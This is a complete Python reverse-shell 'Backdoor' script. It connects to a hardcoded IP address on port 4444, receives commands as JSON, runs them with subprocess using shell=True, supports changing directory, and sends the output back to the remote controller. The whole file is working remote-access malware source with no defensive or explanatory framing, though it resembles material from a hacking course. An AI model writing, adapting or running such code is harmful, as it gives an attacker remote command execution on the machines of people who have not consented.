import socket
import subprocess
import json
import os

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data.decode() if type(data) == bytes else data)
        self.connection.send(json_data.encode())
        
    def reliable_receive(self):
        json_data = self.connection.recv(1024).decode()
        return json.loads(json_data)

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except:
            return "Command Failed."
        
    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
            elif command[0] == "cd" and len(command) > 1:
                command_result = self.change_working_directory(command[1])
            else:
                command_result = self.execute_system_command(command)
            self.reliable_send(command_result)
        connection.close()


my_backdoor = Backdoor("192.168.42.128", 4444)
my_backdoor.run()
